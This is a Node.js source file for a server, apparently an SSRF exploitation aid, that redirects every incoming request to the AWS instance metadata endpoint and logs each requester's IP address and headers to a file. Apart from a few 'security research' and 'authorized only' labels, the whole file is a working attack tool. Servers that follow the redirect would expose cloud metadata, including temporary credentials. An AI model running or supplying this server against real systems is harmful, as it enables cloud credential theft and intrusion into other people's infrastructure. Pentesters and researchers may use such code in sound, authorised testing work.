const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const TARGET_URL = 'http://169.254.169.254/latest/meta-data/';

// Create HTTP server
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Log the request
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} from ${clientIP} - ${userAgent}`);
    
    // Store request details for demonstration
    const requestDetails = {
        timestamp: new Date().toISOString(),
        method: req.method,
        path: req.url,
        headers: req.headers,
        clientIP: clientIP,
        userAgent: userAgent,
        target: TARGET_URL
    };
    
    // Save to log file
    fs.appendFile('ssrf-requests.log', JSON.stringify(requestDetails) + '\n', (err) => {
        if (err) console.error('Error writing log:', err);
    });
    
    // Immediate redirect to AWS metadata service
    res.writeHead(302, {
        'Location': TARGET_URL,
        'X-SSRF-Demonstration': 'Security Research - AWS Metadata Redirect',
        'X-Original-Path': req.url,
        'X-Client-IP': clientIP,
        'X-Target-URL': TARGET_URL,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    });
    
    res.end(`Redirecting to AWS Metadata Service: ${TARGET_URL}\n\n` +
            `This is a security research demonstration.\n` +
            `Original path: ${req.url}\n` +
            `Client IP: ${clientIP}\n` +
            `Timestamp: ${new Date().toISOString()}`);
});

// Handle HTTPS if needed (for domains with SSL)
if (fs.existsSync('./key.pem') && fs.existsSync('./cert.pem')) {
    const options = {
        key: fs.readFileSync('./key.pem'),
        cert: fs.readFileSync('./cert.pem')
    };
    
    https.createServer(options, (req, res) => {
        const parsedUrl = url.parse(req.url, true);
        const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        console.log(`[HTTPS][${new Date().toISOString()}] ${req.method} ${req.url} from ${clientIP}`);
        
        res.writeHead(302, {
            'Location': TARGET_URL,
            'X-SSRF-Demonstration': 'Security Research - AWS Metadata Redirect'
        });
        res.end(`Redirecting to: ${TARGET_URL}`);
    }).listen(443, () => {
        console.log('HTTPS Redirect Server running on port 443');
    });
}

// Start the server
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 AWS Metadata Redirect Server running on port ${PORT}`);
    console.log(`📍 All requests will be redirected to: ${TARGET_URL}`);
    console.log(`📝 Access logs saved to: ssrf-requests.log`);
    console.log('⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY');
    console.log('==========================================');
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down redirect server...');
    process.exit(0);
});
